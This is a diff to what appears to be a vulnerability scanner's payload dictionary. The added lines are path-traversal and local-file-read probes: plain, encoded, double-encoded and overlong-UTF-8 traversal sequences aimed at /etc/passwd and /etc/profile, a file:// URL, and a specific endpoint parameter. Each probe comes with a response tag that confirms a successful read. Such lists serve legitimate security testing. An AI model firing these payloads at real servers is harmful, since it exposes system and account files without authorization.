@@ -105,3 +105,22 @@ ueditor SSRF|存在目录文件 /ueditor/ueditor.config.js、/ueditor/php/getRem
 系统服务|内容|内容|xxxx
 系统服务|内容|内容|xxxx
 系统服务|内容|内容|xxxx
+
+
+
+
+
+
+/etc/passwd        | {tag="root:x:"}
+/proc/meminfo       |   {tag="MemTotal"}  {status=200}                 {root_only}
+/etc/profile         |  {tag="/etc/profile.d/*.sh"}  {status=200}      {root_only}
+/file:///etc/passwd  |  {tag="root:x:"}                                {root_only}
+/../../../../../../../../../../../../../etc/passwd    |  {tag="root:x:"}      {root_only}
+/../../../../../../../../../../../../../etc/profile    | {tag="/etc/profile.d/*.sh"}    {root_only}
+//././././././././././././././././././././././././../../../../../../../../etc/profile   |{tag="/etc/profile.d/*.sh"}    {root_only}
+/aa/../../cc/../../bb/../../dd/../../aa/../../cc/../../bb/../../dd/../../bb/../../dd/../../bb/../../dd/../../bb/../../dd/../../ee/../../etc/profile |  {status=200}  {tag="/etc/profile.d/*.sh"} root_only}
+/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/profile | {tag="/etc/profile.d/*.sh"}    {root_only}
+/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd  |  {tag="root:x:"}    {root_only}
+/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd   |  {tag="root:x:"}       {root_only}
+/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd   |{tag="root:x:"}       {root_only}
+/resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwd  |    {tag="root:x:"}    {root_only}
